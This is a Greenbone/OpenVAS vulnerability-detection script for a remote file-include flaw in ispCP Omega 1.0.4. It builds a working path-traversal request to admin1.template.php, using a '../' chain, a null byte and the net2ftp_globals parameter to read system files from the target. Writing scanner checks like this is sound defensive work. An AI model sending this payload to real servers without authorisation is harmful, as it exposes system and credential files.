# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100526");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-03-11 12:36:18 +0100 (Thu, 11 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("ispCP Omega 'net2ftp_globals[application_skinsdir]' Parameter Remote File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38644");
  script_xref(name:"URL", value:"http://isp-control.net/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"ispCP Omega is prone to a remote file-include vulnerability
because it fails to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file
containing malicious PHP code and execute it in the context of the
webserver process. This may facilitate a compromise of the application
and the underlying system. Other attacks are also possible.

ispCP Omega 1.0.4 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/ispcp", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache(item:url, port:port);
  if( ! buf ) continue;

  if(egrep(pattern: "Powered by <a[^>]+>ispCP Omega", string: buf, icase: TRUE)) {

    foreach file (keys(files)) {

      url = string(dir,"/tools/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=../../../../../../../../../../../",files[file] ,"%00");

      if(http_vuln_check(port:port, url:url,pattern:file)) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
